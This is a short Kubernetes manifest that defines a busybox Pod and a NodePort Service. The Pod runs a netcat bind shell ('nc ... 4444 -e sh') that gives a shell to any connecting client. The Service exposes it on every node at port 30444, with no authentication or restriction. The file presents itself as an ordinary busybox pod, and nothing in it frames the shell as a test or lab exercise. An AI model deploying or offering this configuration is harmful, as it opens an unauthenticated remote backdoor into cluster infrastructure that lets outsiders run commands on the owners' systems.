apiVersion: v1
kind: Pod
metadata:
  name: busybox
  labels:
    app: busybox
spec:
  containers:
  - name: busyboxbusy
    image: busybox:latest
    command: ["sh", "-c", "nc -lp 0.0.0.0 4444 -e sh"]
    ports:
    - containerPort: 4444
  restartPolicy: Always
---
apiVersion: v1
kind: Service
metadata:
  name: busybox-service
spec:
  selector:
    app: busybox
  ports:
  - protocol: TCP
    port: 4444
    targetPort: 4444
    nodePort: 30444   # Static port, can change if needed
  type: NodePort
